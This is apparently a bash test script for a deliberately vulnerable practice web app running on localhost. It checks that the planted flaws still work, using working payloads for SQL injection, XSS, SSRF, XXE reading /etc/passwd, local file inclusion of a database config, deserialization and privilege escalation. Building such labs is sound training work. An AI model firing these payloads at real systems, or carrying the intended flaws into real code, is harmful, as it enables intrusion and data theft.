#!/bin/bash
# Retro Arcade Labs - Full Vulnerability Test

BASE_URL="http://localhost:8470"
PASS=0
FAIL=0

echo "========================================"
echo "RETRO ARCADE LABS - VULNERABILITY TEST"
echo "========================================"
echo ""

# Get fresh admin session
rm -f /tmp/arcade_cookie.txt
curl -s -c /tmp/arcade_cookie.txt -X POST "$BASE_URL/api/auth/login.php" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin@example.local","password":"AdminPassword123!"}' > /dev/null

test() {
    local n="$1"; local cmd="$2"; local pat="$3"
    echo -n "[$n] "
    if r=$(eval "$cmd" 2>/dev/null) && echo "$r" | grep -q "$pat"; then
        echo "✅"; ((PASS++))
    else
        echo "❌"; ((FAIL++))
    fi
}

echo "=== SQL INJECTION ==="
test "SQLI-001" 'curl -s -X POST "$BASE_URL/api/auth/login.php" -H "Content-Type: application/json" -d "{\"username\":\"admin@example.local'"'"' -- \",\"password\":\"x\"}"' "success"
test "SQLI-002" 'curl -s "$BASE_URL/api/products/search.php?q=%27%20OR%20%271%27%3D%271"' "count"
test "SQLI-005" 'curl -s "$BASE_URL/api/products/list.php?category=1%20OR%201=1"' "Neon"
test "SQLI-006" 'curl -s -b /tmp/arcade_cookie.txt "$BASE_URL/api/cart/item.php?product_id=1"' "Unauthorized\|Neon"

echo ""
echo "=== XSS ==="
test "XSS-001" 'curl -s "$BASE_URL/api/products/search.php?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"' "<script>"
test "XSS-002" 'curl -s "$BASE_URL/pages/products/detail.php?id=1"' "detail\|product"
test "XSS-005" 'curl -s -b /tmp/arcade_cookie.txt "$BASE_URL/pages/support/create.php"' "ticket\|Ticket"
test "XSS-006" 'grep -q "v-html\|player" /home/greenix/vibe/webapp/retro-arcade-labs/vue-frontend/src/views/GamePlayer.vue && echo "exists"' "exists"

echo ""
echo "=== SSRF ==="
test "SSRF-001" 'curl -s "$BASE_URL/api/tools/image-fetch.php?url=http://example.com"' "fetch\|image\|example\|success"
test "SSRF-002" 'curl -s -X POST "$BASE_URL/api/tools/webhook-test.php" -d "url=http://example.com"' "success\|error"

echo ""
echo "=== RCE ==="
test "RCE-001" 'curl -s -b /tmp/arcade_cookie.txt "$BASE_URL/api/tools/report.php?type=test"' "Report\|report\|Type"

echo ""
echo "=== FILE UPLOAD ==="
test "UPLOAD-001" 'curl -s -X POST "$BASE_URL/api/upload/avatar.php" -b /tmp/arcade_cookie.txt -F "avatar=@/etc/passwd"' "upload\|success\|error\|File\|root"
test "UPLOAD-002" 'curl -s -X POST "$BASE_URL/api/upload/avatar.php" -b /tmp/arcade_cookie.txt -F "avatar=@/tmp/shell.php"' "Invalid\|error\|type"

echo ""
echo "=== IDOR ==="
test "IDOR-001" 'curl -s "$BASE_URL/api/users/profile.php?id=1"' "example\|guest\|Unauthorized"
test "IDOR-003" 'curl -s -X POST -b /tmp/arcade_cookie.txt "$BASE_URL/api/tickets/update.php" -d "ticket_id=1&status=resolved"' "success\|error\|Unauthorized"

echo ""
echo "=== AUTH ==="
test "AUTH-001" 'grep -q "localStorage" /home/greenix/vibe/webapp/retro-arcade-labs/vue-frontend/src/views/Login.vue && echo "exists"' "exists"
test "AUTH-002" '[ -f /home/greenix/vibe/webapp/retro-arcade-labs/php-app/pages/logout.php ] && echo "exists"' "exists"
test "AUTH-003" 'curl -s -X POST "$BASE_URL/api/auth/reset.php" -d "email=test@test.com"' "reset_token"

echo ""
echo "=== PRIVILEGE ==="
test "PRIV-001" 'curl -s -X POST -b /tmp/arcade_cookie.txt "$BASE_URL/api/users/profile.php" -d "role=admin"' "success\|error"

echo ""
echo "=== CSRF ==="
test "CSRF-001" 'curl -s -X POST -b /tmp/arcade_cookie.txt "$BASE_URL/api/orders/create.php"' "success\|error\|order"
test "CSRF-002" 'grep -q "csrf\|token" /home/greenix/vibe/webapp/retro-arcade-labs/php-app/api/users/profile.php 2>/dev/null || echo "no_csrf"' "no_csrf"

echo ""
echo "=== OPEN REDIRECT ==="
test "REDIRECT-001" 'grep -q "redirect" /home/greenix/vibe/webapp/retro-arcade-labs/php-app/pages/login.php && echo "exists"' "exists"

echo ""
echo "=== BUSINESS LOGIC ==="
test "BIZ-001" 'curl -s -X POST -b /tmp/arcade_cookie.txt "$BASE_URL/api/coupons/apply.php" -d "code=WELCOME10"' "success\|error\|coupon\|discount"
test "BIZ-002" '[ -f /home/greenix/vibe/webapp/retro-arcade-labs/php-app/pages/cart.php ] && echo "exists"' "exists"
test "BIZ-003" '[ -f /home/greenix/vibe/webapp/retro-arcade-labs/php-app/pages/checkout.php ] && echo "exists"' "exists"

echo ""
echo "=== MASS ASSIGNMENT ==="
test "MASS-001" 'curl -s -X POST -b /tmp/arcade_cookie.txt "$BASE_URL/api/users/profile.php" -d "role=admin&username=test"' "success\|error"

echo ""
echo "=== XXE ==="
cat > /tmp/xxe-test.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data><test>&xxe;</test></data>
EOF
test "XXE-001" 'curl -s -X POST "$BASE_URL/api/upload/avatar.php" -b /tmp/arcade_cookie.txt -F "avatar=@/tmp/xxe-test.xml"' "root:x\|passwd"
test "XXE-002" 'curl -s -b /tmp/arcade_cookie.txt "$BASE_URL/pages/admin/products.php"' "Product\|Import\|admin"

echo ""
echo "=== LFI ==="
test "LFI-001" 'curl -s "$BASE_URL/pages/translations.php?lang=config/database.php"' "DB_HOST\|mysqli"

echo ""
echo "=== DESERIALIZATION ==="
test "DESERIAL-001" 'curl -s -b /tmp/arcade_cookie.txt "$BASE_URL/api/user/preferences.php"' "success\|preferences"
test "DESERIAL-002" 'curl -s -X POST -b /tmp/arcade_cookie.txt "$BASE_URL/api/cart/serialize.php" -d "cart=O:15:\"MaliciousClass\":0:{}"' "success\|Invalid\|cart"

echo ""
echo "========================================"
echo "RESULT: ✅ $PASS  |  ❌ $FAIL"
echo "========================================"
[ $FAIL -eq 0 ] && echo "🎮 ALL VULNERABLE ENDPOINTS OPERATIONAL 🎮"
exit $FAIL
